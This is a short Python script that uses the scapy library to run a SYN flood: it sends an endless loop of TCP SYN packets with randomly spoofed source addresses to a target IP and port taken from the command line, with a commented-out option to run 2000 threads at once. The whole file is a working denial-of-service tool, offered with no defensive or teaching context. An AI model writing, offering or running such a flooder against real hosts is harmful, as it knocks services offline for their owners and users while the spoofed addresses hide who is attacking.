from scapy.all import *
from threading import Thread
from sys import argv

def syn_flood(target_ip, target_port):
    while True:
        source_ip = RandIP()
        ip = IP(dst=target_ip, src=source_ip)
        tcp = TCP(dport=target_port, flags="S")
        pkt = ip/tcp
        send(pkt, verbose=False)
        # print(f"Sending SYN from {source_ip} to {target_ip}:{target_port}")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 syn_flood.py <ip> <port>")
        sys.exit(1)

    dst_ip = sys.argv[1]
    dst_port = int(sys.argv[2])

    # # Create a n threads to send SYN packets
    # for i in range(2000):
    #     t = Thread(target=syn_flood, args=(dst_ip, dst_port))
    #     t.daemon = True
    #     t.start()
    # Start
    # Keep the main thread alive
    try:
        while True:
            syn_flood(dst_ip, dst_port)
            pass
    except KeyboardInterrupt:
        print("\nStopping SYN flood...")
        sys.exit(0)

    

if __name__ == "__main__":
    main()
